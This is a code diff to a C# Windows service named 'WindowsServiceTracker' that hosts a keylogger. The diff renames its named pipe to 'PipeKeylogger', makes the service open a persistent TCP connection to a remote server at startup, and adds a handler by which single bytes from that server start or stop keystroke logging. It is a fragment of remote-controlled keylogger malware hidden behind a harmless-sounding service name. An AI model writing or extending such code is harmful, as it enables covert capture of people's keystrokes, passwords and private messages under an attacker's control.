@@ -38,7 +38,7 @@ namespace WindowsServiceTracker
         private volatile TcpClient tcp;
         private NetworkStream tcpStream;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
-            new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeReverse"));
+            new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
         private KeyloggerCommInterface pipeProxy;
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
@@ -68,6 +68,9 @@ namespace WindowsServiceTracker
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
+
+            tcpThread = new Thread(this.MaintainServerConnection);
+            tcpThread.Start();
 
             //StartKeyLogger();
         }
@@ -114,7 +117,7 @@ namespace WindowsServiceTracker
         private void MaintainServerConnection()
         {
             int waitToRetry = 0;
-            int bufferSize = 256;
+            int bufferSize = 1;
             byte[] buffer = new byte[bufferSize];
             while (tcpKeepAlive)
             {
@@ -141,7 +144,17 @@ namespace WindowsServiceTracker
                     if (tcpStream != null && tcpStream.CanRead)
                     {
                         tcpStream.Read(buffer, 0, bufferSize);
-                        //act on buffer contents
+                        switch (buffer[0])
+                        {
+                            case 0:
+                                StartKeylogger();
+                                break;
+                            case 1:
+                                StopKeylogger();
+                                break;
+                            default:
+                                break;
+                        }
                     }
                     else
                     {
